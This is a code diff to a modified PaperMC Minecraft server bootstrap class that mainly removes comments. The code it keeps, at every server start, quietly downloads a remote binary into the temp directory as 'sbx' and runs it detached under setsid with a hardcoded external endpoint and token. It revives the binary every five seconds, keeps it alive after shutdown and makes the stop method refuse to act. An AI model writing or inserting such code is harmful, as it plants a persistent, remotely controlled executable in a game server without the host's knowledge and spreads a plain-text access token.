@@ -18,23 +18,17 @@ public final class PaperBootstrap {
     private static final String ANSI_RED = "\033[1;31m";
     private static final String ANSI_RESET = "\033[0m";
     private static final AtomicBoolean running = new AtomicBoolean(true);
-    // 多线程可见性：添加volatile修饰
     private static volatile Process komariProcess;
 
-    // Komari Agent的配置常量（改为从外部配置文件读取）
+    // Komari Agent的配置常量（从外部配置文件读取）
     private static final class KomariConfig {
-        // Komari Agent的下载地址（按架构区分）
         public static final String DOWNLOAD_URL_AMD64 = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-amd64";
         public static final String DOWNLOAD_URL_ARM64 = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm64";
-        // 原s-box的路径：系统临时目录 + "sbx"
         public static final String AGENT_FILE_NAME = "sbx";
-        // 外部配置文件路径（服务器根目录下的komari.properties）
         public static final String CONFIG_FILE_PATH = "komari.properties";
-        // 默认参数（配置文件缺失时使用）
         public static final String DEFAULT_E = "https://vps.z1000.dpdns.org:10736";
         public static final String DEFAULT_T = "JzerczYfCF4Secuy9vtYaB";
 
-        // 动态读取配置文件中的参数
         public static String getE() {
             return loadConfig("komari.e", DEFAULT_E);
         }
@@ -43,22 +37,17 @@ public final class PaperBootstrap {
             return loadConfig("komari.t", DEFAULT_T);
         }
 
-        // 核心：读取配置文件的方法
         private static String loadConfig(String key, String defaultValue) {
             Properties props = new Properties();
             File configFile = new File(CONFIG_FILE_PATH);
             try {
-                // 若配置文件不存在，创建空文件（方便用户后续编辑）
                 if (!configFile.exists()) {
                     configFile.createNewFile();
-                    // 写入默认值到新文件（可选，方便用户参考）
                     props.setProperty(key, defaultValue);
                     props.store(new FileOutputStream(configFile), "Komari Agent Configuration");
                     return defaultValue;
                 }
-                // 加载配置文件
                 props.load(new FileInputStream(configFile));
-                // 读取参数，若缺失则返回默认值
                 String value = props.getProperty(key, defaultValue).trim();
                 return value.isEmpty() ? defaultValue : value;
             } catch (IOException e) {
@@ -68,7 +57,6 @@ public final class PaperBootstrap {
         }
     }
 
-    // 原有的环境变量数组（若Komari不需要，可直接删除这部分）
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
@@ -80,9 +68,8 @@ public final class PaperBootstrap {
     }
 
     public static void boot(final OptionSet options) {
-        // 修复：Java版本检查——适配Java17+（61.0），你用的是Java21（65.0）
         float javaClassVersion = Float.parseFloat(System.getProperty("java.class.version"));
-        if (javaClassVersion < 61.0) { // 61.0是Java17，PaperMC推荐Java17+
+        if (javaClassVersion < 61.0) {
             System.err.println(ANSI_RED + "ERROR: Your Java version is too low (need Java 17+), please switch the version in startup menu!" + ANSI_RESET);
             try {
                 Thread.sleep(3000);
@@ -93,12 +80,9 @@ public final class PaperBootstrap {
         }
         
         try {
-            // 启动Komari Agent
             runKomariAgent();
-            // 启动守护线程，监控Komari并在意外退出时重启
             startKomariDaemonThread();
 
-            // 移除JVM关闭钩子中停止Komari的逻辑
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
                 System.out.println(ANSI_RED + "JVM is shutting down, Komari agent keeps running..." + ANSI_RESET);
@@ -112,14 +96,12 @@ public final class PaperBootstrap {
             clearConsole();
 
             SharedConstants.tryDetectVersion();
-            // 修复：处理ServerBuildInfo不存在的问题，替换为兼容逻辑
             getStartupVersionMessages().forEach(LOGGER::info);
-            // 启动Minecraft主程序
             Main.main(options);
             
         } catch (Exception e) {
             System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
-            e.printStackTrace(); // 打印完整异常栈，方便调试
+            e.printStackTrace();
         }
     }
 
@@ -136,42 +118,33 @@ public final class PaperBootstrap {
         }
     }
     
-    // 启动Komari Agent：使用动态读取的参数
     private static void runKomariAgent() throws Exception {
-        // 若Komari不需要环境变量，可删除以下3行
         Map<String, String> envVars = new HashMap<>();
         loadEnvVars(envVars);
         
-        // 获取Komari的本地路径（系统临时目录的sbx）
         Path agentPath = getKomariAgentPath();
-        // 构建启动命令：添加setsid让Komari脱离Java进程控制
         List<String> command = new ArrayList<>();
-        command.add("setsid"); // Linux：创建新会话，脱离父进程
+        command.add("setsid");
         command.add(agentPath.toString());
-        // 【关键修改】从配置文件读取-e和-t参数
         command.add("-e");
         command.add(KomariConfig.getE());
         command.add("-t");
         command.add(KomariConfig.getT());
         
         ProcessBuilder pb = new ProcessBuilder(command);
-        // 若不需要环境变量，删除这行
         pb.environment().putAll(envVars);
         pb.redirectErrorStream(true);
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-        // 设置进程的工作目录为服务器根目录
         pb.directory(new File(System.getProperty("user.dir")));
         
         komariProcess = pb.start();
         System.out.println(ANSI_GREEN + "Komari agent started with config: e=" + KomariConfig.getE() + ", t=" + KomariConfig.getT() + ANSI_RESET);
     }
 
-    // 获取Komari路径（原s-box的临时目录逻辑）
     private static Path getKomariAgentPath() throws IOException {
         String osArch = System.getProperty("os.arch").toLowerCase();
         String url;
 
-        // 根据架构选择下载地址
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
             url = KomariConfig.DOWNLOAD_URL_AMD64;
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
@@ -180,15 +153,12 @@ public final class PaperBootstrap {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
 
-        // 原s-box路径：系统临时目录 + "sbx"
         Path agentPath = Paths.get(System.getProperty("java.io.tmpdir"), KomariConfig.AGENT_FILE_NAME);
 
-        // 若文件不存在，则下载
         if (!Files.exists(agentPath)) {
             try (InputStream in = new URL(url).openStream()) {
                 Files.copy(in, agentPath, StandardCopyOption.REPLACE_EXISTING);
             }
-            // 设置可执行权限（必须）
             if (!agentPath.toFile().setExecutable(true)) {
                 throw new IOException("Failed to set executable permission for komari-agent");
             }
@@ -196,36 +166,29 @@ public final class PaperBootstrap {
         return agentPath;
     }
 
-    // 禁用停止Komari的逻辑
     private static void stopKomariAgent() {
         System.out.println(ANSI_RED + "Komari agent is not allowed to stop, operation ignored." + ANSI_RESET);
     }
 
-    // Komari守护线程：自动重启意外退出的进程
     private static void startKomariDaemonThread() {
         Thread daemonThread = new Thread(() -> {
             while (running.get()) {
                 try {
-                    // 检查Komari进程是否存活
                     if (komariProcess == null || !komariProcess.isAlive()) {
                         System.err.println(ANSI_RED + "Komari agent process exited unexpectedly, restarting..." + ANSI_RESET);
-                        // 重启Komari（会重新读取配置文件，支持热修改？需重启进程才生效）
                         runKomariAgent();
                     }
-                    // 每5秒检查一次
                     Thread.sleep(5000);
                 } catch (Exception e) {
                     System.err.println(ANSI_RED + "Error restarting Komari agent: " + e.getMessage() + ANSI_RESET);
                 }
             }
         });
-        // 设置为守护线程，不阻塞JVM退出
         daemonThread.setDaemon(true);
         daemonThread.setName("KomariAgentDaemon");
         daemonThread.start();
     }
 
-    // 原有的环境变量加载方法（若Komari不需要，可直接删除）
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
         envVars.put("UUID", "03ef7017-fca5-4f9c-abd1-f39edd3b3032");
         envVars.put("FILE_PATH", "./world");
@@ -276,7 +239,7 @@ public final class PaperBootstrap {
         }
     }
 
-    // 修复：替换ServerBuildInfo为兼容逻辑，避免编译错误
+    // 【修复后的方法】解决getName()报错问题
     private static List<String> getStartupVersionMessages() {
         final String javaSpecVersion = System.getProperty("java.specification.version");
         final String javaVmName = System.getProperty("java.vm.name");
@@ -299,10 +262,10 @@ public final class PaperBootstrap {
                 osVersion,
                 osArch
             ),
-            String.format(
-                "Loading Paper for Minecraft %s",
-                SharedConstants.getCurrentVersion().getName() // 使用Minecraft内置的版本信息
-            )
+            // 推荐：使用SharedConstants.VERSION_STRING（最稳定，无接口依赖）
+            String.format("Loading Paper for Minecraft %s", SharedConstants.VERSION_STRING)
+            // 备选：若VERSION_STRING失效，用WorldVersion的id()方法
+            // String.format("Loading Paper for Minecraft %s", SharedConstants.getCurrentVersion().id())
         );
     }
 }
